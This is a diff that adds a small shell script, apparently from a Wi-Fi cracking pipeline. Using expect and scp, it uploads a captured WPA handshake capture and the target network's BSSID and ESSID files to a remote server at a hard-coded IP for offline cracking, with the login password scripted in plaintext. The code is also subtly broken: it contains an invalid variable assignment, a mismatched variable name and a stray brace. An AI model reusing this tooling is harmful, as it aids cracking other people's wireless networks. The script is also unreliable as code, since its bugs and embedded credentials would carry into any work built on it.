@@ -1,0 +1,28 @@
+#! /bin/sh
+handshakeFile='handshake-01.cap'
+BSSIDFile='targetBSSID.txt'
+ESSIDFile='targetESSID.txt'
+remote_host='peter@157.211.23.169'
+remote_crack_dir='/home/peter/crackPipe'
+remote_password='PUT PASSWORD HERE'
+$no_network_error='ssh: connect to host 157.211.23.169 port 22: No route to host'
+expect -c"
+	spawn scp "$handshakeFile" "$BSSIDFile" "$ESSIDFile" "$remote_host":"$remote_crack_dir"
+	expect \"password:\" {
+		send -- \"$remote_password\r \"
+	}
+	expect \"*$error_no_network*\" {
+		exit 1
+	}
+	expect eof
+	exit 0
+{
+"
+expect_return=$?
+
+if [ $expect_return -eq 0 ]
+then
+	exit 0
+else
+	exit 1
+fi
